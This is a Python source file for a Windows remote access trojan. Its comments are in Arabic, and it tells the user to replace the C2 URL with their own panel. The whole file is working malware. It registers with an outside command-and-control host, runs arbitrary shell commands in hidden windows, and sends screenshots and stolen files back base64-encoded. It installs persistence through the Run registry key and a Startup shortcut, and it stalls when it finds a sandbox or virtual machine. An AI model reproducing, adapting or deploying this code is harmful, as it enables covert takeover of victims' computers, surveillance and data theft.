import requests
import os
import time
import socket
import platform
import subprocess
import base64
import sys
import shutil
import threading
import random

# ============================================================
# 🔴 عوض الرابط هنا بالرابط ديالك (Render.com مثلاً)
# ============================================================
C2_URL = "https://myc2panel.onrender.com"

BOT_ID = socket.gethostname() + "_" + os.getenv('USERNAME', 'user')
current_directory = os.getcwd()
VERSION = "3.1"

# ========== تقنيات تجنب التحليل ==========
def anti_sandbox():
    """تأخير بسيط لتجاوز بيئات التحليل السريعة"""
    time.sleep(60)  # انتظر دقيقة قبل بدء العمل
    # كشف البيئة الافتراضية (مثال بسيط)
    if os.path.exists("C:\\Program Files\\VMware\\") or os.path.exists("C:\\Program Files\\VirtualBox\\"):
        # إذا كان في جهاز افتراضي، ننام فترة طويلة جداً
        time.sleep(3600)  # ساعة كاملة
        return False
    return True

# ========== الثبات ==========
def install_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysHelper /t REG_SZ /d "{script_path}" /f'
        os.system(reg_cmd)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_script = os.path.join(startup_folder, 'syshelper.lnk')
        if not os.path.exists(startup_script):
            vbs_code = f'''
Set WshShell = CreateObject("WScript.Shell")
Set shortcut = WshShell.CreateShortcut("{startup_script}")
shortcut.TargetPath = "{script_path}"
shortcut.WorkingDirectory = "{os.path.dirname(script_path)}"
shortcut.Save
'''
            with open("tmp_startup.vbs", "w") as f:
                f.write(vbs_code)
            os.system("cscript tmp_startup.vbs")
            os.remove("tmp_startup.vbs")
        return True
    except:
        return False

# ========== تصوير الشاشة ==========
def take_screenshot():
    try:
        from PIL import ImageGrab
        import io
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
    except:
        return "[ERROR] Screenshot failed"

# ========== تحميل الملفات ==========
def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"[ERROR] File not found: {filepath}"
        with open(filepath, 'rb') as f:
            data = f.read()
        return f"[FILE] {filepath} ({len(data)} bytes)\n" + base64.b64encode(data).decode('utf-8')
    except Exception as e:
        return f"[ERROR] Cannot read file: {e}"

# ========== التنفيذ المخفي ==========
def execute_any_command(cmd, cwd):
    try:
        CREATE_NO_WINDOW = 0x08000000
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=cwd,
            creationflags=CREATE_NO_WINDOW,
            encoding='utf-8',
            errors='ignore'
        )
        stdout, stderr = process.communicate(timeout=30)
        output = stdout + stderr
        if not output.strip():
            output = "[EXECUTED] Command ran successfully (No output)."
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return "[TIMEOUT] Command took longer than 30 seconds."
    except Exception as e:
        return f"[ERROR] {e}"

# ========== البداية ==========
# تجنب التحليل
if not anti_sandbox():
    # إذا كشف بيئة افتراضية، ينام لفترة طويلة جداً
    while True:
        time.sleep(3600)

print(f"[+] Agent v{VERSION} started. ID: {BOT_ID}")

# تثبيت الثبات في خلفية
threading.Thread(target=install_persistence, daemon=True).start()

# التسجيل مع إعادة المحاولة
registered = False
while not registered:
    try:
        requests.post(f"{C2_URL}/register", json={
            "id": BOT_ID,
            "os": platform.system()
        }, timeout=3)
        registered = True
        print("[+] Registered.")
    except:
        time.sleep(10)

# ========== الحلقة الرئيسية ==========
while True:
    try:
        resp = requests.get(f"{C2_URL}/get_task", params={"id": BOT_ID}, timeout=5)
        if resp.status_code == 200:
            cmd = resp.json().get("command", "").strip()
            if cmd:
                output = ""
                if cmd.lower().startswith("cd "):
                    try:
                        new_path = cmd[3:].strip()
                        if not new_path:
                            new_path = os.path.expanduser("~")
                        os.chdir(new_path)
                        current_directory = os.getcwd()
                        output = f"[CWD] {current_directory}"
                    except Exception as e:
                        output = f"Error: {e}"
                elif cmd.lower() == "screenshot":
                    output = take_screenshot()
                elif cmd.lower().startswith("download "):
                    file_path = cmd[9:].strip()
                    output = download_file(file_path)
                elif cmd.lower() == "persist":
                    if install_persistence():
                        output = "[PERSIST] Done."
                    else:
                        output = "[PERSIST] Failed."
                else:
                    output = execute_any_command(cmd, current_directory)
                
                requests.post(f"{C2_URL}/send_result", json={
                    "id": BOT_ID,
                    "output": output,
                    "cwd": current_directory
                }, timeout=3)
    except Exception as e:
        pass
    time.sleep(2)
    